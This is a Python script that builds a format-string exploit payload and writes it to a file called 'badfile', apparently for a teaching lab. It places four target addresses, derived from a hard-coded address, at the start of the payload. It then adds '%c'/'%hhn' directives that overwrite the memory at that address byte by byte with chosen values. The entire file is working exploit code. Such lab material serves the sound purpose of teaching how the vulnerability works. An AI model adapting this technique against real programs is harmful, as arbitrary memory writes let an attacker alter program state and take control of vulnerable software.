#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068  # addr of target value
content[0:4]   = (number+3).to_bytes(4,byteorder='little')
content[4:8]   = (number+2).to_bytes(4,byteorder='little')
content[8:12]  = (number+1).to_bytes(4,byteorder='little')
content[12:16] = (number).to_bytes(4,byteorder='little')

fmt  = ("%{}c%{}$hhn").format(0xAA-4*4, 64).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0x11, 65).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0x11, 66).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0x11, 67).encode('latin-1')
content[16:16+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
